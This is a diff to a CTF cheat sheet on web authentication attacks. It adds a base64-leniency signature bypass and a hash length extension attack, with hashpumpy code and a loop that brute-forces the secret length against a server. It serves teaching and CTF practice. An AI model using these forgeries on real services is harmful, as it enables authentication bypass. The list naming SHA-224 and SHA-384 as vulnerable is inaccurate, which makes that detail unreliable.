@@ -13,6 +13,8 @@
 - [Apache Guacamole Connection Parameter Extraction (Barrier HTB)](#apache-guacamole-connection-parameter-extraction-barrier-htb)
 - [Login Page Poisoning for Credential Harvesting (Watcher HTB)](#login-page-poisoning-for-credential-harvesting-watcher-htb)
 - [TeamCity REST API RCE (Watcher HTB)](#teamcity-rest-api-rce-watcher-htb)
+- [Base64 Decode Leniency and Parameter Override for Signature Bypass (BCTF 2016)](#base64-decode-leniency-and-parameter-override-for-signature-bypass-bctf-2016)
+- [Hash Length Extension Attack (ASIS CTF 2017)](#hash-length-extension-attack-asis-ctf-2017)
 
 For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For general auth bypass and access control, see [auth-and-access.md](auth-and-access.md).
 
@@ -74,7 +76,7 @@ forged = f"{new_header.decode()}.{new_payload.decode()}."
 # 3. Bound to user session (not just random)
 ```
 
-**Key insight:** OAuth/OIDC attacks typically target redirect_uri validation (open redirect → token theft), token manipulation (alg:none, JWKS injection), or state parameter CSRF. Always test redirect_uri with path traversal, fragment injection, and subdomain tricks.
+**Key insight:** OAuth/OIDC (OpenID Connect) attacks typically target redirect_uri validation (open redirect → token theft), token manipulation (alg:none, JWKS injection), or state parameter CSRF. Always test redirect_uri with path traversal, fragment injection, and subdomain tricks.
 
 ---
 
@@ -110,7 +112,7 @@ fetch('https://target.com/api/user/profile', {
 });
 ```
 
-**Key insight:** CORS is exploitable when `Access-Control-Allow-Origin` reflects the `Origin` header AND `Access-Control-Allow-Credentials: true`. Check for subdomain matching (`*.target.com` accepts `evil-target.com`), null origin acceptance (`sandbox` iframe), and prefix/suffix matching bugs.
+**Key insight:** CORS (Cross-Origin Resource Sharing) is exploitable when `Access-Control-Allow-Origin` reflects the `Origin` header AND `Access-Control-Allow-Credentials: true`. Check for subdomain matching (`*.target.com` accepts `evil-target.com`), null origin acceptance (`sandbox` iframe), and prefix/suffix matching bugs.
 
 ---
 
@@ -237,3 +239,81 @@ curl 'http://HOST:8111/httpAuth/downloadBuildLog.html?buildId=ID' -u 'USER:PASS'
 ```
 
 **Key insight:** If build agent runs as root, all build steps execute as root. Check `ps aux` for build agent process ownership. TeamCity REST API provides full project/build management — admin credentials = RCE.
+
+---
+
+## Base64 Decode Leniency and Parameter Override for Signature Bypass (BCTF 2016)
+
+Server RSA-signs an order string, then parses `&`-separated parameters. Python's `b64decode()` silently ignores non-base64 characters. Appending `&price=0` after the base64 signature exploits both behaviors:
+
+```python
+# Original signed order: "item=widget&price=100"
+# Server returns: base64(RSA_sign(order)) as signature
+
+# Attack: append &price=0 after the signature
+# b64decode("VALID_SIG_BASE64&price=0") silently ignores "&price=0"
+# But the parameter parser sees: item=widget&price=100&price=0
+# Last value wins: price=0
+```
+
+**Key insight:** Gap between what is signed (pre-signature content) and what is parsed (full string including post-signature data), enabled by base64's tolerance for non-alphabet characters. Any system that concatenates signed data with unsigned parameters and uses lenient base64 decoding is vulnerable. Defense: validate signature over the exact bytes being parsed, not a subset.
+
+---
+
+## Hash Length Extension Attack (ASIS CTF 2017)
+
+**Pattern:** Merkle-Damgård hash functions (MD5, SHA-1, SHA-256) used as `MAC = H(secret || message)` are vulnerable to length extension. Given `H(secret || message)` and the length of `secret`, an attacker can compute `H(secret || message || padding || extension)` without knowing the secret. The internal hash state at the end of the original digest is sufficient to continue hashing.
+
+```python
+# Vulnerable MAC construction:
+import hashlib
+mac = hashlib.sha256(secret + message).hexdigest()
+# Server sends: mac + message to client, verifies by recomputing H(secret || message)
+
+# Attack: extend the message without knowing the secret
+# hashpumpy does the heavy lifting:
+import hashpumpy
+
+original_mac = "a1b2c3..."     # known hash
+original_msg = b"user=alice"   # known message
+secret_len   = 16              # known or brute-forced (try 1-100)
+extension    = b"&admin=true"  # data to append
+
+new_mac, new_msg = hashpumpy.hashpump(
+    original_mac,   # original hexdigest
+    original_msg,   # original data (without secret)
+    extension,      # data to append
+    secret_len      # secret length
+)
+
+# new_msg = original_msg + padding + extension
+# new_mac = valid H(secret || new_msg) without knowing secret
+```
+
+```bash
+# Alternative: hash_extender tool
+hash_extender \
+    --data "user=alice" \
+    --secret-min 1 --secret-max 50 \
+    --append "&admin=true" \
+    --signature "a1b2c3..." \
+    --format sha256
+
+# Or: manual Python with hashpumpy, brute-force secret length
+for length in range(1, 101):
+    new_mac, new_msg = hashpumpy.hashpump(orig_mac, orig_msg, extension, length)
+    r = requests.get(url, params={"data": new_msg.hex(), "mac": new_mac})
+    if "success" in r.text:
+        print(f"Secret length: {length}, Flag: {r.text}")
+        break
+```
+
+**Padding structure:** Between the original message and the extension, the hash algorithm inserts its standard padding:
+```text
+original_msg || 0x80 || 0x00...0x00 || length_in_bits (8 bytes big-endian)
+```
+This padding is part of `new_msg` — the server will verify it as-is.
+
+**Vulnerable algorithms:** MD5, SHA-1, SHA-224, SHA-256, SHA-384, SHA-512 (all Merkle-Damgård). **Not vulnerable:** HMAC (uses two separate hash passes), SHA-3/Keccak (sponge construction), BLAKE2/3.
+
+**Key insight:** Any Merkle-Damgård hash used as `H(secret || data)` without HMAC construction leaks internal state at the message boundary, enabling arbitrary message extension. Use `hashpumpy` or `hash_extender`. If the secret length is unknown, brute-force it (1-100 is a reasonable range for CTFs) — the valid extension will produce a server-accepted MAC.
